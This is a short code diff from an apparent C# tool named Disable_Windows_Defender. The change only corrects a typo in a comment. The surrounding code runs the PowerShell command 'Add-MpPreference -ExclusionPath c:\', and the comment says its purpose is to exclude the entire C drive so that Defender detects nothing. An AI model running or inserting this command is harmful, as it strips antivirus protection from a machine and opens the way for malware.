@@ -58,7 +58,7 @@ namespace Disable_Windows_Defender
                 }
             };
             proc.Start();
-            //The line you won't regret, The puropse of this one is obvious, which is to add the whole C drive in the exclusion list, even if Windows Defender re-enabled itself somehow after an updated or something it won't detect literally ANYTHING. Version 1909 (OSBuild 1836.657)
+            //The line you won't regret, The purpose of this one is obvious, which is to add the whole C drive in the exclusion list, even if Windows Defender re-enabled itself somehow after an updated or something it won't detect literally ANYTHING. Version 1909 (OSBuild 1836.657)
             RunPS("Add-MpPreference -ExclusionPath c:\");
             while (!proc.StandardOutput.EndOfStream)
             {
